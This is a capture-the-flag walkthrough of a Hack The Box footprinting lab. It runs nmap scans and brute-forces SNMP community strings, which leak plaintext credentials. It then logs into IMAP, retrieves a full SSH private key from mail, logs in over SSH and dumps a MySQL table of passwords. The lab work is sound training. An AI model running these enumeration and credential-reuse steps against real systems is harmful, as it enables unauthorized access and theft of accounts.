# &#x1F6A9; Footprinting Lab - Hard <br>
<mark>Hack The Box Penetration Tester Path full walkthrough <a href="https://github.com/sudo-st8less?tab=repositories">catalog</a>.</mark><br>
### <mark>hook the repo up with a &#x2B50; if it helps</mark> <br>
### 🐦: @<a href="https://x.com/st8less">**st8less**</a>

---

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to acces

---

Target IP: 10.129.202.20

---

### Question 1:
#### Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer. 

Initial nmap scan:

	$ sudo nmap -sT -sC -sV -A -v -p- -oA init_all_ports 10.129.202.20
		
		PORT    STATE SERVICE  VERSION
		22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
		|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
		|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
		110/tcp open  pop3     Dovecot pop3d
		|_pop3-capabilities: PIPELINING RESP-CODES USER TOP SASL(PLAIN) CAPA UIDL STLS AUTH-RESP-CODE
		| ssl-cert: Subject: commonName=NIXHARD
		| Subject Alternative Name: DNS:NIXHARD
		| Issuer: commonName=NIXHARD
		| Public Key type: rsa
		| Public Key bits: 2048
		| Signature Algorithm: sha256WithRSAEncryption
		| Not valid before: 2021-11-10T01:30:25
		| Not valid after:  2031-11-08T01:30:25
		| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
		|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
		|_ssl-date: TLS randomness does not represent time
		143/tcp open  imap     Dovecot imapd (Ubuntu)
		| ssl-cert: Subject: commonName=NIXHARD
		| Subject Alternative Name: DNS:NIXHARD
		| Issuer: commonName=NIXHARD
		| Public Key type: rsa
		| Public Key bits: 2048
		| Signature Algorithm: sha256WithRSAEncryption
		| Not valid before: 2021-11-10T01:30:25
		| Not valid after:  2031-11-08T01:30:25
		| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
		|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
		|_imap-capabilities: more AUTH=PLAINA0001 post-login LITERAL+ listed IDLE STARTTLS Pre-login capabilities LOGIN-REFERRALS have ID SASL-IR ENABLE OK IMAP4rev1
		|_ssl-date: TLS randomness does not represent time
		993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
		|_imap-capabilities: more SASL-IR LITERAL+ post-login listed IDLE Pre-login capabilities AUTH=PLAINA0001 have ID LOGIN-REFERRALS ENABLE OK IMAP4rev1
		| ssl-cert: Subject: commonName=NIXHARD
		| Subject Alternative Name: DNS:NIXHARD
		| Issuer: commonName=NIXHARD
		| Public Key type: rsa
		| Public Key bits: 2048
		| Signature Algorithm: sha256WithRSAEncryption
		| Not valid before: 2021-11-10T01:30:25
		| Not valid after:  2031-11-08T01:30:25
		| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
		|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
		|_ssl-date: TLS randomness does not represent time
		995/tcp open  ssl/pop3 Dovecot pop3d
		| ssl-cert: Subject: commonName=NIXHARD
		| Subject Alternative Name: DNS:NIXHARD
		| Issuer: commonName=NIXHARD
		| Public Key type: rsa
		| Public Key bits: 2048
		| Signature Algorithm: sha256WithRSAEncryption
		| Not valid before: 2021-11-10T01:30:25
		| Not valid after:  2031-11-08T01:30:25
		| MD5:   2b45:ec3c:508f:3cfb:9f6a:750c:63f8:2077
		|_SHA-1: ed43:7d5a:3c46:54ac:9902:8dc4:9d86:6efb:2ae3:357c
		|_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES CAPA USER UIDL PIPELINING AUTH-RESP-CODE
		|_ssl-date: TLS randomness does not represent time

Nothing available without creds. Let's try a UDP scan:

	$ sudo nmap -sU -Pn -n --disable-arp-ping -sC -sV -A -v -F -oA sU_init 10.129.202.20
	
		PORT      STATE         SERVICE        VERSION
		9/udp     open|filtered discard
		53/udp    open|filtered domain
		67/udp    open|filtered dhcps
		68/udp    open|filtered dhcpc
		69/udp    open|filtered tftp
		88/udp    open|filtered kerberos-sec
		111/udp   open|filtered rpcbind
		123/udp   open|filtered ntp
		137/udp   open|filtered netbios-ns
		158/udp   open|filtered pcmail-srv
		161/udp   open          snmp           net-snmp; net-snmp SNMPv3 server
		| snmp-info: 
		|   enterprise: net-snmp
		|   engineIDFormat: unknown
		|   engineIDData: 5b99e75a10288b6100000000
		|   snmpEngineBoots: 11
		|_  snmpEngineTime: 1h30m35s
		162/udp   open|filtered snmptrap
		427/udp   open|filtered svrloc
		514/udp   open|filtered syslog
		515/udp   open|filtered printer
		520/udp   open|filtered route
		996/udp   open|filtered vsinet
		997/udp   open|filtered maitrd
		998/udp   open|filtered puparp
		1022/udp  open|filtered exp2
		1023/udp  open|filtered unknown
		1027/udp  open|filtered unknown
		1030/udp  open|filtered iad1
		1900/udp  open|filtered upnp
		2049/udp  open|filtered nfs
		2223/udp  open|filtered rockwell-csp2
		3283/udp  open|filtered netassistant
		3456/udp  open|filtered IISrpc-or-vat
		3703/udp  open|filtered adobeserver-3
		4500/udp  open|filtered nat-t-ike
		5060/udp  open|filtered sip
		5353/udp  open|filtered zeroconf
		32768/udp open|filtered omad
		32771/udp open|filtered sometimes-rpc6
		49154/udp open|filtered unknown
		49156/udp open|filtered unknown
		49182/udp open|filtered unknown
		49190/udp open|filtered unknown
		49191/udp open|filtered unknown
		49192/udp open|filtered unknown
		49193/udp open|filtered unknown
		49200/udp open|filtered unknown

Found a lot of ports here but 161 sticks out. lets try 161 w/ snmp. Will try tftp after.

Here I tried using onesixtyone:

	$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
	
		Scanning 1 hosts, 3219 communities
		10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

Found 'backup'. Let's use it with snmpwalk:

	$ snmpwalk -v2c -c backup 10.129.202.20
	
		iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
		iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
		iso.3.6.1.2.1.1.3.0 = Timeticks: (667684) 1:51:16.84
		iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
		iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
		iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
		iso.3.6.1.2.1.1.7.0 = INTEGER: 72
		iso.3.6.1.2.1.1.8.0 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
		iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
		iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
		iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
		iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
		iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
		iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
		iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
		iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
		iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
		iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
		iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
		iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
		iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
		iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
		iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
		iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
		iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
		iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
		iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
		iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (7) 0:00:00.07
		iso.3.6.1.2.1.25.1.1.0 = Timeticks: (668420) 1:51:24.20
		iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 08 1D 17 01 17 00 2B 00 00 
		iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
		iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
		"
		iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
		iso.3.6.1.2.1.25.1.6.0 = Gauge32: 142
		iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
		iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
		iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
		iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
		iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
		iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
		iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
		iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
		iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
		iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
		iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
		iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
		Authentication token manipulation error
		chpasswd: (line 1, user tom) password not changed
		Changing password for tom."
		iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
		iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
		iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
		iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
		iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
		iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
		iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

### Found: 
- "Admin <tech@inlanefreight.htb>"
- "Inlanefreight"
- "/opt/tom-recovery.sh"
- Possible creds: "tom NMds732Js2761"

connected to imap with the new creds, dug around:

	$ openssl s_client -connect 10.129.202.20:imaps
		
		read R BLOCK
		* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
		1 login tom NMds732Js2761
		1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
		1 LIST "" *
		* LIST (\HasNoChildren) "." Notes
		* LIST (\HasNoChildren) "." Meetings
		* LIST (\HasNoChildren \UnMarked) "." Important
		* LIST (\HasNoChildren) "." INBOX
		1 OK List completed (0.021 + 0.000 + 0.020 secs).
		1 LSUB "" *
		1 OK Lsub completed (0.001 + 0.000 secs).
		1 select Notes
		* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
		* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
		* 0 EXISTS
		* 0 RECENT
		* OK [UIDVALIDITY 1636509065] UIDs valid
		* OK [UIDNEXT 1] Predicted next UID
		1 OK [READ-WRITE] Select completed (0.010 + 0.000 + 0.009 secs).
		1 select Meetings
		* OK [CLOSED] Previous mailbox closed.
		* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
		* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
		* 0 EXISTS
		* 0 RECENT
		* OK [UIDVALIDITY 1636509063] UIDs valid
		* OK [UIDNEXT 1] Predicted next UID
		1 OK [READ-WRITE] Select completed (0.012 + 0.000 + 0.011 secs).
		1 select Important
		* OK [CLOSED] Previous mailbox closed.
		* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
		* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
		* 0 EXISTS
		* 0 RECENT
		* OK [UIDVALIDITY 1636509062] UIDs valid
		* OK [UIDNEXT 1] Predicted next UID
		1 OK [READ-WRITE] Select completed (0.005 + 0.000 + 0.004 secs).
		1 select INBOX
		* OK [CLOSED] Previous mailbox closed.
		* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
		* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
		* 1 EXISTS
		* 0 RECENT
		* OK [UIDVALIDITY 1636509064] UIDs valid
		* OK [UIDNEXT 2] Predicted next UID
		1 OK [READ-WRITE] Select completed (0.006 + 0.000 + 0.005 secs).
		1 fetch 1 all
		* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL))
		1 OK Fetch completed (0.006 + 0.000 + 0.005 secs).
		1 FETCH 1 BODY
		* 1 FETCH (BODY ("text" "plain" ("charset" "us-ascii") NIL NIL "7bit" 3430 49))
		1 OK Fetch completed (0.001 + 0.000 secs).
		1 fetch 1 body[]
		* 1 FETCH (BODY[] {3661}
		HELO dev.inlanefreight.htb
		MAIL FROM:<tech@dev.inlanefreight.htb>
		RCPT TO:<bob@inlanefreight.htb>
		DATA
		From: [Admin] <tech@inlanefreight.htb>
		To: <tom@inlanefreight.htb>
		Date: Wed, 10 Nov 2010 14:21:26 +0200
		Subject: KEY
		
		-----BEGIN OPENSSH PRIVATE KEY-----
		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
		-----END OPENSSH PRIVATE KEY-----
		)
		1 OK Fetch completed (0.001 + 0.000 secs).

Found SSH key!

copied to local file:

		$ touch stolen_id_rsa
		$ nano stolen_id_rsa

SSH'd into the box using the new ssh key:

	$ ssh -i stolen_id_rsa tom@10.129.202.20

found some interesting clues in bash history:

	tom@NIXHARD:~$ cat .bash_history
	
		mysql -u tom -p
		ssh-keygen -t rsa -b 4096
		ls
		ls -al
		cd .ssh/
		ls
		cd mail/
		ls
		ls -al
		cd .imap/
		ls
		cd Important/
		ls
		set term=xterm
		vim key
		cat ~/.ssh/id_rsa
		vim key
		ls
		mv key ..
		cd ..
		ls
		mv key Important/
		mv Important/key ../
		cd ..
		ls
		ls -l
		id
		cat /etc/passwd
		ls
		cd mail/
		ls
		ls -al
		cd mail/
		ls
		rm Meetings 
		rm TESTING Important 
		ls -l
		cd ..
		ls -al
		mv mail/key Maildir/.Important/new/
		mv Maildir/.Important/new/key Maildir/new/
		cd Maildir/new/
		ls
		cd ..
		tree .
		cat cur/key
		cd cur/
		ls
		ls -al
		cat "key:2,"
		mysql -u tom -p 
		mysql -u tom -p

Looked for anything shiny in his home dirs with no avail.
decided to try to login to mysql:

	tom@NIXHARD:/home/ubuntu$ mysql -u tom -p
		Enter password: 


	mysql> show databases;
		+--------------------+
		| Database           |
		+--------------------+
		| information_schema |
		| mysql              |
		| performance_schema |
		| sys                |
		| users              |
		+--------------------+
		5 rows in set (0.00 sec)
		
	mysql> use users;
		Database changed
		mysql> show tables;
		+-----------------+
		| Tables_in_users |
		+-----------------+
		| users           |
		+-----------------+
		1 row in set (0.00 sec)
		mysql> show columns from users;
		+----------+-------------+------+-----+---------+-------+
		| Field    | Type        | Null | Key | Default | Extra |
		+----------+-------------+------+-----+---------+-------+
		| id       | int         | YES  |     | NULL    |       |
		| username | varchar(50) | YES  |     | NULL    |       |
		| password | varchar(50) | YES  |     | NULL    |       |
		+----------+-------------+------+-----+---------+-------+
		3 rows in set (0.00 sec)
		
	mysql> select username, password from users;
		+-------------------+------------------------------+
		| username          | password                     |
		+-------------------+------------------------------+
		| ppavlata0         | 6znAfvTbB2                   |
		| ktofanini1        | TP2NxFD62e                   |
		| rallwell2         | t1t7WaqvEfv                  |
		| swahlberg43       | 46gOiZ                       |
		| crubinivitz44     | FLlYii1mQz84                 |
		| HTB               | cr3n4o7rzse7rzhnckhssncif7ds |
		| wdoswell46        | FYXMuelBVcS                  |
		| ccollingwood47    | LM6SU2N3w7KQ                 |
		| nfoux48           | N40DfFww                     |
		| gboyat49          | W1LDy7                       |
		| csuddick4a        | UIGXl3lL                     |
		| tmatieu4b         | c5PYl7yfJi                   |
		| ielsy4c           | 3hLC705Oj                    |
		| ebotwood4d        | aQmW5c7                      |
		| gcirlos4e         | SPsU9obCa                    |
		| smucklestone4f    | Ho96mUx                      |
		| hdain4g           | BGMRtb                       |
		| dmcquillin4h      | 37kwHEdFhAlL                 |
		| gfolan4i          | 1d9kcofM                     |
		
		+-------------------+------------------------------+

### &#x1F6A9; found **cr3n4o7rzse7rzhnckhssnci--edit--**
